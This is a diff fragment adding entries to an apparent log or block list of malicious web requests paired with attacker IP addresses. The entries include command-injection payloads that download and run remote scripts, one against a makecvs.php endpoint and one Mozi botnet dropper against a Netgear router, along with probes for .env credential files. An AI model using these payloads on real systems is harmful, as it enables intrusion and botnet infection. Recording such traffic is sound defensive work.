+        "offense": "include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22.setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22.setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%20.setup%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%20.setup.py%3Bchmod%20777%20.setup.py%3Bchmod%20777%20.setup%3Bpython2%20.setup.py%7C%7Cpython2.7%20.setup.py%7C%7Cpython%20.setup.py%7C%7C.%2F.setup.py%7C%7C.%2F.setup%60",
+        "ipAddress": "106.244.201.149"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "149.202.8.122"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.154.129.119"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "103.123.66.194"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "192.99.154.196"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.34.8:38637/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "178.175.34.8"
+    }
+]
